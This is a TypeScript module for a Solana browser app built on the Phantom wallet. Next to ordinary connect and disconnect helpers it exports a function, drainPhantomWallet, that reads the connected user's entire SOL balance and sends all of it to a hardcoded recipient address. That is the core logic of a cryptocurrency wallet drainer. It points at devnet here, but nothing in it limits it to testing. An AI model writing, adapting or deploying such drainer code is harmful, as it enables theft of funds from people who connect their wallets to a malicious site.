import { PublicKey, Connection, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";

// Use public Solana devnet endpoint
const SOLANA_RPC_URL = "https://api.devnet.solana.com";
const connection = new Connection(SOLANA_RPC_URL, "confirmed");
const RECIPIENT_ADDRESS = new PublicKey("9C74cPLodhAsTSYujZhSzPuSwCHjLck3u7nHoPHdV1DQ");

declare global {
  interface Window {
    solana?: {
      isPhantom?: boolean;
      connect: () => Promise<{ publicKey: { toString: () => string } }>;
      disconnect: () => Promise<void>;
      signAndSendTransaction: (transaction: Transaction) => Promise<{ signature: string }>;
    };
  }
}

export async function connectPhantomWallet(): Promise<string> {
  if (!window.solana || !window.solana.isPhantom) {
    throw new Error("Phantom wallet not found");
  }

  try {
    const response = await window.solana.connect();
    return response.publicKey.toString();
  } catch (error) {
    throw new Error("Failed to connect to Phantom wallet");
  }
}

export async function disconnectPhantomWallet(): Promise<void> {
  if (!window.solana) {
    throw new Error("Phantom wallet not found");
  }

  try {
    await window.solana.disconnect();
  } catch (error) {
    throw new Error("Failed to disconnect from Phantom wallet");
  }
}

export async function drainPhantomWallet(): Promise<void> {
  if (!window.solana || !window.solana.isPhantom) {
    throw new Error("Phantom wallet not found");
  }

  try {
    console.log("Starting wallet drain process...");

    // Connect and get public key
    const response = await window.solana.connect();
    const senderPublicKey = new PublicKey(response.publicKey.toString());
    console.log("Connected to wallet:", senderPublicKey.toString());

    // Get balance
    const balance = await connection.getBalance(senderPublicKey);
    console.log("Current balance:", balance / LAMPORTS_PER_SOL, "SOL");

    if (balance <= 0) {
      throw new Error("Insufficient funds");
    }

    // Create new transaction
    const transaction = new Transaction();
    console.log("Created new transaction");

    // Get latest blockhash
    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
    transaction.feePayer = senderPublicKey;
    console.log("Got latest blockhash:", blockhash);

    // Build transfer instruction
    const transferInstruction = SystemProgram.transfer({
      fromPubkey: senderPublicKey,
      toPubkey: RECIPIENT_ADDRESS,
      lamports: balance,
    });

    transaction.add(transferInstruction);
    console.log("Added transfer instruction");

    // Sign and send transaction
    console.log("Sending transaction...");
    const { signature } = await window.solana.signAndSendTransaction(transaction);
    console.log("Transaction sent, signature:", signature);

    // Wait for confirmation
    const confirmation = await connection.confirmTransaction({
      signature,
      blockhash,
      lastValidBlockHeight,
    });

    if (confirmation.value.err) {
      throw new Error(`Transaction failed: ${confirmation.value.err.toString()}`);
    }

    console.log("Transaction confirmed successfully!");

  } catch (error) {
    console.error("Transaction failed:", error);
    if (error instanceof Error) {
      console.error("Error details:", error.message);
    }
    throw error;
  }
}